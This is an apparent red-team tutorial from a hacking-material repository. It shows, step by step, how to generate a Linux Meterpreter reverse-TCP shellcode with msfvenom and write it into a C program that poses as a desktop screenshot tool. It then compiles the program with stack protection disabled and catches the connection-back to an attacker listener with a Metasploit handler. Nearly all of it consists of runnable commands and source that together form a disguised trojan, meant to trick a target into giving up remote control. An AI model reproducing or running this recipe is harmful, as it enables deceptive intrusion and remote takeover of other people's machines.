#### :: SHELLCODE DESCRIPTION (Wikipedia)
In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. However, attempts at replacing the term have not gained wide acceptance. Shellcode is commonly written in machine code. 

---

<br />

#### :: EXERCISE OBJECTIVES
Use Metasploit to build shellcode in C format and Insert the C shellcode into a C program (RAT)<br />
To be abble to control of a linux system remotely using social engineering.

<br />

#### :: STEPS REQUIRED TO ACHIEVE THIS
[1º - Use Metasploit to Build Shellcode in C Format](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#-use-metasploit-to-build-shellcode-in-c-format)<br />
[2º - Insert the C shellcode created into a C program](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#-insert-the-c-shellcode-created-into-a-c-program)<br />
[3º - Use GCC to compile the C program (make it executable)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#-use-gcc-to-compile-the-c-program-make-it-executable)<br />

<br />

#### :: [SOCIAL ENGINEERING](https://en.wikipedia.org/wiki/Social_engineering_(security)) (Why execute this?)
**'Take a desktop screenshot using a C program'**.<br />
The C program not only runs the shellcode (RAM) that allows us to control the target PC remotely,<br />
but also executes a system command (sh) that takes a screenshot of the target PC desktop using<br />
[MITRE ATT&CK T1113](https://attack.mitre.org/techniques/T1113/) (xwd package) Technic. **'(Screenshot Function Inside the C Program)'**:<br />

    system("sleep 1; xwd -root -out /tmp/ScreenShot.xwd");

<br />

#### :: MULTI-THREADING (exec simultaneously -> screenshot + shellcode)
Its achieved using the bash & operator that backgrounds the current system call (display screenshot)
while jumping to the next C Program function (execute shellcode in RAM).**'(Multi-Thread Inside C Program)'**:<br />

    system("sleep 1; xwud -in /tmp/ScreenShot.xwd &");
    void (*ret)() = (void(*)())buf;


<br /><br />

| DEPENDENCIE | DESCRIPTION | FUNCTION | REQUIRED |
|---|---|---|---|
| Metasploit | Metasploit Framework | Build Shellcode + Recive Connection ( handler )| yes |
| [GCC](https://www.cyberciti.biz/faq/debian-linux-install-gnu-gcc-compiler/) | C Compiler | Compile the C Program ( make it executable ) | yes |
| [xwd](http://blog.tordeu.com/?p=135) | X Window Screenshots | Take Screenshots ( social engineering ) | optional |


<br /><br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#-exercise-objectives)

---

### :: STEP-BY-STEP (HOW-TO)
Execute all the follow commands sequencialy into your terminal windows<br />
All Commands required to acomplish this exercise are inside the grey box(s).<br />
This exercise its written this way to allow readers to work only in terminal windows.<br />

<br /><br />

#### :: Build shellcode folder

```
sudo mkdir shellcode
cd shellcode
```

![pic](http://i63.tinypic.com/2dl9pop.png)

<br />

#### :: Start postgresql service

```
sudo service postgresql start
```

![pic](http://i63.tinypic.com/2eoikbo.png)

<br />

#### :: Use Metasploit to Build Shellcode in C Format
WARNING: Replace LHOST value by your local ip address<br />
WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />

```
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -b '\x00' -a x86 --platform linux -f c -o chars.raw

```

![pic](http://i64.tinypic.com/muk5xu.png)

- **'Msfvenom Syntax'**
  - -p payload name
  - -b delete nul bites from shellcode **\x00**
  - -a payload arch
  - -f shellcode format
  - -o write output to a file 

<br />

#### :: See whats written inside chars.raw (optional)

```
cat chars.raw
```

![pic](http://i66.tinypic.com/i6xzyw.png)

<br />

#### [Parse](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/bash/parsing_data_in_bash.md) shellcode data and store it into a local bash variable

```
pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
```

![pic](http://i65.tinypic.com/2090m12.png)

The shellcode data its now stored inside a bash local variable named **$pa**<br />
This variable its going to be used to embebbed the shellcode in to C Program while we<br />
are creating it using the follow commands described in the next grey box.<br />

<br />

#### :: Insert the C shellcode created into a C program

```
echo "#include<stdio.h>" > payload.c
echo "#include<stdlib.h>" >> payload.c
echo "#include<string.h>" >> payload.c
echo "" >> payload.c
echo "unsigned char buf[] = \"$pa\";" >> payload.c
echo "" >> payload.c
echo "int main()" >> payload.c
echo "{" >> payload.c
echo "  printf(\"\\nPlease Wait, Taking Screenshot ..\n....................................\", strlen(buf));" >> payload.c
echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
echo "  void (*ret)() = (void(*)())buf;" >> payload.c
echo "  ret();" >> payload.c
echo "}" >> payload.c
```

![pic](http://i67.tinypic.com/309rd74.png)

<br />

#### :: See whats written inside payload.c (optional)

```
cat payload.c
```

![pic](http://i68.tinypic.com/24y1ojb.png)

<br />

#### :: Use GCC to compile the C program (make it executable)

```
sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
```

![pic](http://i68.tinypic.com/15klg4.png)

<br />

#### :: Start metasploit multi handler
WARNING: Replace LHOST value by your local ip address<br />
WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64<br />

```
sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
```

![pic](http://i68.tinypic.com/15wlyxs.png)

<br />

#### :: Execute the C Program (remote machine)

```
chmod +x desktop_screenshot
sudo ./desktop_screenshot
```

![pic](http://i67.tinypic.com/16h9sax.png)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#-exercise-objectives)

---

<br />

#### :: Video Tutorial

[C Shellcode Linux - Video Tutorial](https://blablabla.)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/shellcoding/C_Shellcode_Linux.md#-exercise-objectives)

---

### Suspiciou Shell Activity - RedTeam @2019


